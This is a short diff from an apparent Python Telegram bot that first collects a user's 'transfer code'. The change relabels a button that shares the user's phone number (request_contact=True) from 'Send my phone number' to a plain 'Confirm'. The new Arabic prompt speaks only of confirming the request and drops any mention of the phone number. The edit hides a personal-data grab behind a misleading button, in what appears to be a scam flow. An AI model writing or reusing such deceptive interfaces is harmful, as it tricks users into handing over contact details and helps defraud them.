@@ -704,12 +704,12 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data["waiting_code"] = False
 
         kbd = ReplyKeyboardMarkup(
-            [[KeyboardButton("📱 إرسال رقم هاتفي", request_contact=True)]],
+            [[KeyboardButton("✅ تــأكــيــد ✅", request_contact=True)]],
             resize_keyboard=True, one_time_keyboard=True
         )
         await update.message.reply_text(
             "✅ *تم استلام كود التحويل*\n\n"
-            "الآن اضغط على الزر أدناه لإرسال رقم هاتفك لإتمام الطلب 👇",
+            "الآن اضغط على زر تـأكـيـد في الأسفل لإتمام الطلب ، سوف يصلك الرد خلال وقت قصير 👇",
             reply_markup=kbd,
             parse_mode=ParseMode.MARKDOWN
         )
